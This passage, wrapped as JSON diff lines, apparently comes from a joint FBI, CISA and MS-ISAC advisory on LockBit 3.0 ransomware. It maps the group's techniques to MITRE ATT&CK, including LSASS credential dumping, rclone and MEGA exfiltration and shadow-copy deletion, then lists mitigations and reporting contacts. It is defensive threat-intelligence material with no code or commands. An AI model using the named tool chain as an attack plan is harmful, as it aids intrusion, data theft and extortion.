+  "text": "Execution           Guardrails:    T1480.001         LockBit 3.0 will only decrypt the main\n        Environmental Keying                                 component or continue to decrypt and/or\n                                                             decompress data if the correct password is\n                                                             entered."
+ },
+ {
+  "id": "p66",
+  "text": "Credential Access"
+ },
+ {
+  "id": "p67",
+  "text": "Technique Title              ID                                 Use"
+ },
+ {
+  "id": "p68",
+  "text": "OS Credential Dumping: LSASS       T1003.001         LockBit 3.0 uses Microsoft Sysinternals\n        Memory                                               ProDump to dump the contents of\n                                                             LSASS.exe."
+ },
+ {
+  "id": "p69",
+  "text": "Discovery"
+ },
+ {
+  "id": "p70",
+  "text": "Technique Title                   ID                                   Use"
+ },
+ {
+  "id": "p71",
+  "text": "Network Service Discovery                  T1046            LockBit 3.0 uses SoftPerfect Network\n                                                                    Scanner to scan target networks."
+ },
+ {
+  "id": "p72",
+  "text": "System Information Discovery               T1082            LockBit 3.0 will enumerate system\n                                                                    information to include hostname, host\n                                                                    configuration, domain information, local\n                                                                    drive configuration, remote shares, and\n                                                                    mounted external storage devices."
+ },
+ {
+  "id": "p73",
+  "text": "System Location Discovery:               T1614.001          LockBit 3.0 will not infect machines with\n        System Language Discovery                                   language settings that match a defined\n                                                                    exclusion list."
+ },
+ {
+  "id": "p74",
+  "text": "Lateral Movement"
+ },
+ {
+  "id": "p75",
+  "text": "Technique Title                   ID                                   Use"
+ },
+ {
+  "id": "p76",
+  "text": "Remote    Services:            Remote    T1021.001          LockBit 3.0 uses Splashtop remote-\n        Desktop Protocol                                            desktop software to facilitate lateral\n                                                                    movement."
+ },
+ {
+  "id": "p77",
+  "text": "Command and Control"
+ },
+ {
+  "id": "p78",
+  "text": "Technique Title                   ID                                   Use"
+ },
+ {
+  "id": "p79",
+  "text": "Application Layer Protocol: File         T1071.002          LockBit 3.0 uses FileZilla for C2.\n        Transfer Protocols"
+ },
+ {
+  "id": "p80",
+  "text": "Protocol Tunnel                            T1572            LockBit 3.0 uses Plink to automate SSH\n                                                                    actions on Windows."
+ },
+ {
+  "id": "p81",
+  "text": "Exfiltration"
+ },
+ {
+  "id": "p82",
+  "text": "Technique Title                   ID                                   Use"
+ },
+ {
+  "id": "p83",
+  "text": "Exfiltration                              TA0010            LockBit 3.0 uses Stealbit, a custom\n                                                                    exfiltration tool first used with LockBit 2.0,\n                                                                    to steal data from a target network."
+ },
+ {
+  "id": "p84",
+  "text": "Exfiltration Over Web Service          T1567           LockBit 3.0 uses publicly available file\n                                                               sharing services to exfiltrate a target’s\n                                                               data."
+ },
+ {
+  "id": "p85",
+  "text": "Exfiltration Over Web Service:       T1567.002         LockBit 3.0 actors use (1) rclone, an open\n        Exfiltration to Cloud Storage                          source command line cloud storage\n                                                               manager to exfiltrate and (2) MEGA, a\n                                                               publicly available file sharing service for\n                                                               data exfiltration."
+ },
+ {
+  "id": "p86",
+  "text": "Impact"
+ },
+ {
+  "id": "p87",
+  "text": "Technique Title                ID                                 Use"
+ },
+ {
+  "id": "p88",
+  "text": "Data Destruction                       T1485           LockBit 3.0 deletes log files and empties\n                                                               the recycle bin."
+ },
+ {
+  "id": "p89",
+  "text": "Data Encrypted for Impact              T1486           LockBit 3.0 encrypts data on target\n                                                               systems to interrupt availability to system\n                                                               and network resources."
+ },
+ {
+  "id": "p90",
+  "text": "Service Stop                           T1489           LockBit 3.0 terminates processes and\n                                                               services."
+ },
+ {
+  "id": "p91",
+  "text": "Inhibit System Recovery                T1490           LockBit 3.0 deletes volume shadow copies\n                                                               residing on disk."
+ },
+ {
+  "id": "p92",
+  "text": "Defacement: Internal                 T1491.001         LockBit 3.0 changes the host system’s\n        Defacement                                             wallpaper and icons to the LockBit 3.0\n                                                               wallpaper and icons, respectively."
+ },
+ {
+  "id": "p93",
+  "text": "MITIGATIONS\n       The FBI, CISA, and the MS-ISAC recommend organizations implement the mitigations below to\n       improve your organization’s cybersecurity posture on the basis of LockBit 3.0’s activity. These\n       mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA\n       and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of\n       practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST\n       based the CPGs on existing cybersecurity frameworks and guidance to protect against the most\n       common and impactful TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more\n       information on the CPGs, including additional recommended baseline protections."
+ },
+ {
+  "id": "p94",
+  "text": "    Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary\n                data and servers [CPG 7.3] in a physically separate, segmented, and secure location (e.g.,\n                hard drive, storage device, the cloud).\n               Require all accounts with password logins (e.g., service account, admin accounts, and\n                domain admin accounts) to comply with National Institute for Standards and Technology\n                (NIST) standards for developing and managing password policies [CPG 3.4].\n                   o Use longer passwords consisting of at least 8 characters and no more than 64\n                       characters in length [CPG 1.4]\n                   o Store passwords in hashed format using industry-recognized password managers\n                   o Add password user “salts” to shared login credentials\n                   o Avoid reusing passwords\n                   o Implement multiple failed login attempt account lockouts [CPG 1.1]\n                   o Disable password “hints”\n                   o Refrain from requiring password changes more frequently than once per year\n                       Note: NIST guidance suggests favoring longer passwords instead of requiring regular\n                       and frequent password resets. Frequent password resets are more likely to result in\n                       users developing password “patterns” cyber criminals can easily decipher.\n                   o Require administrator credentials to install software\n               Require phishing-resistant multifactor authentication [CPG 1.3] for all services to the\n                extent possible, particularly for webmail, virtual private networks, and accounts that access\n                critical systems.\n               Keep all operating systems, software, and firmware up to date. Timely patching is one of\n                the most efficient and cost-effective steps an organization can take to minimize its exposure to\n                cybersecurity threats.\n               Segment networks [CPG 8.1] to prevent the spread of ransomware. Network segmentation\n                can help prevent the spread of ransomware by controlling traffic flows between—and access\n                to—various subnetworks and by restricting adversary lateral movement.\n               Identify, detect, and investigate abnormal activity and potential traversal of the\n                indicated ransomware with a networking monitoring tool. To aid in detecting the\n                ransomware, implement a tool that logs and reports all network traffic, including lateral\n                movement activity on a network [CPG 5.1]. Endpoint detection and response (EDR) tools are\n                particularly useful for detecting lateral connections as they have insight into common and\n                uncommon network connections for each host.\n               Install, regularly update, and enable real time detection for antivirus software on all\n                hosts.\n               Review domain controllers, servers, workstations, and active directories for new and/or\n                unrecognized accounts.\n               Audit user accounts with administrative privileges and configure access controls according\n                to the principle of least privilege [CPG 1.5].\n               Disable unused ports."
+ },
+ {
+  "id": "p95",
+  "text": "    Consider adding an email banner to emails [CPG 8.3] received from outside your\n                organization.\n               Disable hyperlinks in received emails.\n               Implement time-based access for accounts set at the admin level and higher. For\n                example, the Just-in-Time (JIT) access method provisions privileged access when needed\n                and can support enforcement of the principle of least privilege (as well as the Zero Trust\n                model). This is a process where a network-wide policy is set in place to automatically disable\n                admin accounts at the Active Directory level when the account is not in direct need. Individual\n                users may submit their requests through an automated process that grants them access to a\n                specified system for a set timeframe when they need to support the completion of a certain\n                task.\n               Disable command-line and scripting activities and permissions. Privilege escalation and\n                lateral movement often depend on software utilities running from the command line. If threat\n                actors are not able to run these tools, they will have difficulty escalating privileges and/or\n                moving laterally.\n               Maintain offline backups of data, and regularly maintain backup and restoration [CPG 7.3].\n                By instituting this practice, the organization ensures they will not be severely interrupted,\n                and/or only have irretrievable data.\n               Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and\n                covers the entire organization’s data infrastructure [CPG 3.3]."
+ },
+ {
+  "id": "p96",
+  "text": "VALIDATE SECURITY CONTROLS\n       In addition to applying mitigations, the FBI, CISA, and the MS-ISAC recommend exercising, testing,\n       and validating your organization's security program against the threat behaviors mapped to the\n       MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and the MS-ISAC\n       authoring agencies recommend testing your existing security controls inventory to assess how they\n       perform against the ATT&CK techniques described in this advisory.\n       To get started:\n           1. Select an ATT&CK technique described in this advisory (see Table 3).\n           2. Align your security technologies against the technique.\n           3. Test your technologies against the technique.\n           4. Analyze your detection and prevention technologies performance.\n           5. Repeat the process for all security technologies to obtain a set of comprehensive performance\n              data.\n           6. Tune your security program, including people, processes, and technologies, based on the\n              data generated by this process.\n       The FBI, CISA, and the MS-ISAC recommend continually testing your security program at scale and\n       in a production environment to ensure optimal performance against the MITRE ATT&CK techniques\n       identified in this advisory."
+ },
+ {
+  "id": "p97",
+  "text": "RESOURCES\n               Stopransomware.gov is a whole-of-government approach that gives one central location for\n                ransomware resources and alerts.\n               Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis\n                Center (MS-ISAC) Joint Ransomware Guide.\n               No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness\n                Assessment."
+ },
+ {
+  "id": "p98",
+  "text": "REPORTING\n       The FBI is seeking any information that can be legally shared, including:\n               Boundary logs showing communication to and from foreign IP addresses\n               Sample ransom note\n               Communications with LockBit 3.0 actors\n               Bitcoin wallet information\n               Decryptor files\n               Benign sample of an encrypted file"
+ },
+ {
+  "id": "p99",
+  "text": "The FBI, CISA, and MS-ISAC do not encourage paying ransom, as payment does not guarantee\n       victim files will be recovered. Furthermore, payment may also embolden adversaries to target\n       additional organizations, encourage other criminal actors to engage in the distribution of ransomware,\n       and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the\n       ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field\n       Office or CISA at report@cisa.gov. State, local, tribal, and territorial (SLTT) government entities can\n       also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722)."
+ },
+ {
+  "id": "p100",
+  "text": "DISCLAIMER\n       The information in this report is being provided “as is” for informational purposes only. The FBI, CISA,\n       and the MS-ISAC do not endorse any commercial product or service, including any subjects of\n       analysis. Any reference to specific commercial products, processes, or services by service mark,\n       trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation,\n       or favoring by the FBI, CISA, or the MS-ISAC."
+ }
+]
